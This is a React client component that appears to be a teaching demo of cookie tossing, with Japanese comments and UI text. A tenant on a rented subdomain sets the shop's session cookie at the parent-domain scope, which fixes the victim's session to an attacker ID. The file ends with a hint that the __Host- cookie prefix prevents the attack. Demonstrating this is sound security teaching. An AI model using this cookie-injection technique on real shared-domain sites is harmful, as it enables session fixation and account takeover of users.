'use client';

import { useState } from 'react';

const SESSION = 'haki_shop_session';

// 悪意あるテナント側。自分は evil.覇気.com という正規に借りたサブドメインを持つだけ。
// だが Domain=覇気.com を付けて Cookie を書けるので、shop の名前空間に割り込める。
export default function EvilClient() {
  const [done, setDone] = useState(false);
  const attackerId = 'attacker-999';

  const toss = () => {
    // shop が使うのと同じ Cookie 名を、親ドメインスコープで植える＝ Cookie tossing
    document.cookie = `${SESSION}=${attackerId}; domain=覇気.com; path=/; max-age=3600`;
    setDone(true);
  };

  const clear = () => {
    document.cookie = `${SESSION}=; domain=覇気.com; path=/; max-age=0`;
    setDone(false);
  };

  return (
    <main className="demo-stage demo-evil">
      <p className="demo-kicker">テナント（悪意あり）</p>
      <h1 className="demo-title">😈 evil.覇気.com</h1>
      <p className="demo-lead">
        オレは <code>evil.覇気.com</code> を正規に借りているだけ。でも Cookie は
        <code>Domain=覇気.com</code> で書ける。つまり <code>shop.覇気.com</code> の
        セッションに割り込める。
      </p>

      <button className="demo-btn demo-btn--danger" onClick={toss} type="button">
        shop にオレのセッションを植える 💉
      </button>
      <button className="demo-btn demo-btn--ghost" onClick={clear} type="button">
        後始末（Cookieを消す）
      </button>

      {done && (
        <p className="demo-alert">
          仕込み完了。<code>{SESSION}={attackerId}</code> を <code>Domain=覇気.com</code> で植えた。
          この状態で <code>shop.覇気.com</code> を開くと、被害者のセッションがオレのIDに
          すり替わっている。
        </p>
      )}

      <p className="demo-hint">
        防御策：shop 側がセッション Cookie を <code>__Host-</code> プレフィックスで発行していれば、
        Domain 指定が禁止され、この割り込みは成立しない。
      </p>
    </main>
  );
}
